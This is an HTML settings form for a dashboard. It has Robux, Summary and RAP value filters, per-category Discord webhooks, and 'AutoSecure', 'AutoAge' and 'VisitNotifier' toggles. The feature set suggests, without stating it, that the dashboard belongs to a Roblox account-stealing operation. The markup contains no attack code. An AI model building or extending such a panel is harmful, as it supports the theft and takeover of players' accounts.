<div class="px-4 py-6 md:px-6 md:py-8">
  <section class="max-w-5xl mx-auto">
    <div class="bg-black/30 border border-white/10 rounded-xl p-5 md:p-7">
      <div class="space-y-7">
        <div>
          <h2 class="text-lg font-semibold text-white mb-3">Custom Filters</h2>
          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div>
              <label for="minRobux" class="block text-sm font-medium text-white/80 mb-2">Robux</label>
              <div class="flex items-center gap-2">
                <button type="button" onclick="decrement('minRobux')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">-</button>
                <input type="number" id="minRobux" value="0" class="w-full px-3 py-2 bg-zinc-800 border border-zinc-700 rounded-lg text-center focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent" min="0" onchange="validateNumber(this)" />
                <button type="button" onclick="increment('minRobux')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">+</button>
              </div>
            </div>
            <div>
              <label for="minSummary" class="block text-sm font-medium text-white/80 mb-2">Summary</label>
              <div class="flex items-center gap-2">
                <button type="button" onclick="decrement('minSummary')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">-</button>
                <input type="number" id="minSummary" value="0" class="w-full px-3 py-2 bg-zinc-800 border border-zinc-700 rounded-lg text-center focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent" min="0" onchange="validateNumber(this)" />
                <button type="button" onclick="increment('minSummary')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">+</button>
              </div>
            </div>
            <div>
              <label for="minRAP" class="block text-sm font-medium text-white/80 mb-2">RAP</label>
              <div class="flex items-center gap-2">
                <button type="button" onclick="decrement('minRAP')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">-</button>
                <input type="number" id="minRAP" value="0" class="w-full px-3 py-2 bg-zinc-800 border border-zinc-700 rounded-lg text-center focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent" min="0" onchange="validateNumber(this)" />
                <button type="button" onclick="increment('minRAP')" class="px-4 py-2 bg-zinc-800 border border-zinc-700 rounded-lg hover:bg-zinc-700 transition-colors">+</button>
              </div>
            </div>
          </div>
        </div>

        <hr class="border-white/10" />

        <div>
          <h2 class="text-lg font-semibold text-white mb-3">Webhooks</h2>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label for="webhookDefault" class="block text-sm font-medium text-white/80 mb-2">Default</label>
              <input type="text" id="webhookDefault" placeholder="https://..." class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent" />
            </div>
            <div>
              <label for="webhookRobux" class="block text-sm font-medium text-white/80 mb-2">Robux</label>
              <input type="text" id="webhookRobux" placeholder="https://..." class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent" />
            </div>
            <div>
              <label for="webhookSummary" class="block text-sm font-medium text-white/80 mb-2">Summary</label>
              <input type="text" id="webhookSummary" placeholder="https://..." class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent" />
            </div>
            <div>
              <label for="webhookRAP" class="block text-sm font-medium text-white/80 mb-2">RAP</label>
              <input type="text" id="webhookRAP" placeholder="https://..." class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent" />
            </div>
          </div>
        </div>

        <hr class="border-white/10" />

        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <h2 class="text-lg font-semibold text-white mb-3">Dashboard</h2>
            <div class="space-y-3">
              <label for="dashboardAnonymous" class="flex items-center gap-3 text-sm text-white/85">
                <input id="dashboardAnonymous" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>Anonymous</span>
              </label>
              <label for="dashboardAutosecure" class="flex items-center gap-3 text-sm text-white/85">
                <input id="dashboardAutosecure" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>AutoSecure</span>
              </label>
              <label for="dashboardAutoAge" class="flex items-center gap-3 text-sm text-white/85">
                <input id="dashboardAutoAge" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>AutoAge</span>
              </label>
            </div>
          </div>
          <div>
            <h2 class="text-lg font-semibold text-white mb-3">Discord</h2>
            <div class="space-y-3">
              <label for="embedPingEveryone" class="flex items-center gap-3 text-sm text-white/85">
                <input id="embedPingEveryone" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>@everyone</span>
              </label>
              <label for="embedPingHere" class="flex items-center gap-3 text-sm text-white/85">
                <input id="embedPingHere" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>@here</span>
              </label>
              <label for="embedVisitNoti" class="flex items-center gap-3 text-sm text-white/85">
                <input id="embedVisitNoti" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-zinc-900 border-zinc-600 rounded focus:ring-blue-500 focus:ring-2" />
                <span>VisitNotifier</span>
              </label>
            </div>
          </div>
        </div>

        <hr class="border-white/10" />

        <div>
          <h2 class="text-lg font-semibold text-white mb-3">Custom Game</h2>
          <input type="text" id="customGameLink" placeholder="8737899170, 920587237, 142823291" class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent" />
        </div>

        <div class="pt-1">
          <button id="submit" class="w-full bg-indigo-500 hover:bg-indigo-400 text-white font-medium py-2.5 px-6 rounded-lg transition duration-200">
            Save Changes
          </button>
        </div>
      </div>
    </div>
  </section>
</div>
